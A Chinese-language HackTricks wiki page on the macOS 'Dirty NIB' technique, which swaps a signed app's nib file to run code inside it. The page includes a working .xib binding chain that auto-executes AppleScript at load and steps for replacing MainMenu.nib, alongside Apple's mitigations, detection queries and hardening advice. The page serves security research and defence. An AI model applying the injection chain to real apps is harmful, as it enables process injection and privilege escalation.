# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB 是指滥用已签名 macOS app bundle 内的 Interface Builder 文件（.xib/.nib），在目标进程中执行攻击者控制的逻辑，从而继承其 entitlements 和 TCC 权限。该技术最初由 xpn（MDSec）记录，之后由 Sector7 进行了推广和大幅扩展；Sector7 还介绍了 Apple 在 macOS 13 Ventura 和 macOS 14 Sonoma 中采取的缓解措施。<sup>[[1]](#references)[[2]](#references)</sup> 如需了解背景和深入分析，请参阅文末的 references。

> TL;DR
> • macOS 13 Ventura 之前：替换 bundle 的 MainMenu.nib（或其他启动时加载的 nib）通常可以可靠地实现进程注入，并且经常能够实现权限提升。
> • macOS 13（Ventura）开始，并在 macOS 14（Sonoma）中进一步增强：首次启动时的深度验证、bundle 保护、Launch Constraints，以及新的 TCC“App Management”权限，基本上阻止了无关 app 在启动后篡改 nib。不过，在一些特殊情况下攻击仍可能可行（例如，同一 developer 的工具修改其自身 app，或用户授予终端 App Management/Full Disk Access 权限的情况）。


## 什么是 NIB/XIB 文件

Nib（NeXT Interface Builder 的缩写）文件是 AppKit app 使用的序列化 UI 对象图。现代 Xcode 会存储可编辑的 XML .xib 文件，并在构建时将其编译为 .nib。典型 app 通过 `NSApplicationMain()` 加载其主 UI；该函数会从 app 的 Info.plist 中读取 `NSMainNibFile` 键，并在运行时实例化对象图。

能够实现该攻击的关键点：
- NIB 加载会实例化任意 Objective-C 类，而不要求这些类符合 NSSecureCoding（如果没有 `initWithCoder:`，Apple 的 nib loader 会回退到 `init`/`initWithFrame:`）。
- Cocoa Bindings 可被滥用于在 nib 实例化时调用方法，其中包括无需用户交互即可执行的链式调用。


## Dirty NIB 注入过程（攻击者视角）

Ventura 之前的经典流程：
1) 创建恶意 .xib
- 添加一个 `NSAppleScript` 对象（或其他 gadget 类，例如 `NSTask`）。
- 添加一个 `NSTextField`，其 title 包含 payload（例如 AppleScript 或命令参数）。
- 添加一个或多个 `NSMenuItem` 对象，通过 bindings 将其连接到目标对象上的方法。

2) 在无需用户点击的情况下自动触发
- 使用 bindings 设置菜单项的 target/selector，然后调用私有的 `_corePerformAction` 方法，使该 action 在 nib 加载时自动触发。这样就不需要用户点击按钮。

.xib 内自动触发链的最小示例（为清晰起见进行了删减）：
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
这可以在 nib 加载时，在目标进程中执行任意 AppleScript。<sup>[[1]](#references)</sup> 高级链可以：
- 实例化任意 AppKit classes（例如 `NSTask`），并调用零参数 methods，例如 `-launch`。
- 通过上述 binding trick，使用 object arguments 调用任意 selectors。
- 加载 AppleScriptObjC.framework，以桥接到 Objective-C，甚至调用选定的 C APIs。
- 在仍包含 Python.framework 的旧系统上，桥接到 Python，然后使用 `ctypes` 调用任意 C functions（Sector7 的研究）。<sup>[[2]](#references)</sup>

3) 替换 app 的 nib
- 将 target.app 复制到可写位置，把例如 `Contents/Resources/MainMenu.nib` 替换为 malicious nib，然后运行 target.app。在 Ventura 之前，经过一次性 Gatekeeper assessment 后，后续启动只会执行浅层 signature checks，因此不会重新验证非 executable resources（例如 .nib）。

用于可见测试的 AppleScript payload 示例：
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## 现代 macOS 保护机制（Ventura/Monterey/Sonoma/Sequoia）

Apple 引入了多项系统级缓解措施，大幅降低了 Dirty NIB 在现代 macOS 中的可行性：<sup>[[2]](#references)</sup>
- 首次启动深度验证和 bundle 保护（macOS 13 Ventura）
- 在任何 app 首次运行时（无论是否 quarantined），深度 signature check 都会覆盖 bundle 中的所有 resources。之后，bundle 会受到保护：只有来自同一 developer 的 app（或由该 app 明确允许的 app）才能修改其内容。其他 app 需要新的 TCC “App Management” permission，才能写入另一个 app 的 bundle。
- Launch Constraints（macOS 13 Ventura）
- System/Apple-bundled apps 无法被复制到其他位置并启动；这会阻止“复制到 /tmp、patch、运行”这一针对 OS apps 的方法。
- macOS 14 Sonoma 中的改进
- Apple 强化了 App Management，并修复了已知的 bypass（例如 Sector7 提到的 CVE‑2023‑40450）。Python.framework 更早之前已被移除（macOS 12.3），导致某些 privilege-escalation chains 失效。
- Gatekeeper/Quarantine 变更
- 如需了解 Gatekeeper、provenance 以及影响该 technique 的 assessment 变更，请参阅下方引用的页面。

> 实际影响
> • 在 Ventura+ 上，通常无法修改第三方 app 的 .nib，除非你的 process 具有 App Management，或使用与目标 app 相同 Team ID 进行签名（例如 developer tooling）。
> • 向 shells/terminals 授予 App Management 或 Full Disk Access，实际上会为任何能够在该 terminal context 中执行 code 的对象重新开放这一 attack surface。


### 处理 Launch Constraints

从 Ventura 开始，Launch Constraints 会阻止许多 Apple apps 从非默认位置运行。如果你依赖 Ventura 之前的 workflow，例如将 Apple app 复制到临时目录、修改 `MainMenu.nib` 并启动它，请预计该方法在 >= 13.0 上会失败。


## 枚举 targets 和 nibs（对 research / legacy systems 很有用）

- 定位由 nib 驱动 UI 的 apps：
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- 在 bundle 内查找候选 nib 资源：
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- 深度验证代码签名（如果篡改了资源却没有重新签名，将会失败）：
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> 注意：在现代 macOS 上，若没有适当授权，尝试写入其他应用的 bundle 时，还会受到 bundle protection/TCC 的阻止。


## Detection and DFIR tips

- 对 bundle 资源进行文件完整性监控
- 监控已安装应用中 `Contents/Resources/*.nib` 及其他非可执行资源的 mtime/ctime 变化。
- Unified logs 和进程行为
- 监控 GUI 应用中意外的 AppleScript 执行，以及加载 AppleScriptObjC 或 Python.framework 的进程。例如：
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- 主动评估
- 定期对关键应用运行 `codesign --verify --deep`，确保资源保持完整。
- 权限上下文
- 审计哪些用户/进程拥有 TCC “App Management” 或 Full Disk Access 权限（尤其是终端和管理 agent）。从通用 shell 中移除这些权限，可以防止轻易重新启用 Dirty NIB 风格的篡改。


## Defensive hardening (developers and defenders)

- 优先使用编程方式构建 UI，或限制从 nibs 实例化的内容。避免在 nib 图中包含强大类（例如 `NSTask`），并避免使用会间接调用任意对象 selector 的 bindings。
- 采用带有 Library Validation 的 hardened runtime（现代应用已普遍采用）。虽然这本身无法阻止 nib injection，但可以阻止容易实现的原生代码加载，并迫使攻击者使用仅限 scripting 的 payload。
- 不要在通用工具中请求或依赖广泛的 App Management 权限。如果 MDM 需要 App Management，应将该上下文与用户驱动的 shell 隔离。
- 定期验证应用 bundle 的完整性，并使更新机制能够自动修复 bundle 资源。


## Related reading in HackTricks

详细了解会影响此技术的 Gatekeeper、quarantine 和 provenance 变化：

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB（包含 Pages 示例的原始 write-up）](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
